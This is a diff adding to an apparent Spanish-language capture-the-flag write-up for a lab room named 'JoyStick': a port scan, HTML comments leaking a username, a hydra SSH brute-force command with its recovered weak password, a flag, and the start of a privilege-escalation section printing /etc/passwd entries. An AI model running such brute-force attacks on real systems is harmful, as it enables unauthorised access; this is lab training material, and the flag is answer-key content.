@@ -1,4 +1,5 @@
 # JoyStick
+Room Sencillita , solo bruteforcing
 ## Initial Scan
 ```
 21/tcp open  ftp     vsftpd 3.0.3
@@ -13,3 +14,33 @@
 |_http-title: JoyStick Gaming
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 ```
+## Enum
+
+### HTTP
+
+```html
+<!-- Zach, I don't care that you named your user steve. You still need to finish making the website -->
+<!-- Great, and now the FTP server just doesn't work. Just another great idea after	your failed irc chat. Why would we use that when we have in game chat? 
+Not to mention that I know you still haven't reset your password.  -->
+```
+
+Por lo que se ve tenemos un usuario llamado Steve con creds faciles de averiguar
+
+### SSH
+
+Vamos a hacerle bruteforcing
+```
+hydra -l steve -P rockyou.txt 10.10.101.140 -t 16 ssh
+[22][ssh] host: 10.10.101.140   login: steve   password: changeme
+```
+
+Accedemos con las creds y ya tenemos acceso a la primera flag
+```
+flag{is_only_gaem}
+```
+### Privesc
+
+```
+root:x:0:0:root:/root:/bin/bash
+notch:x:1000:1000:Notch,,,:/home/notch:/bin/bash
+minecraft:x:1001:1001:Mine,,,:/home/minecraft:/bin/bash
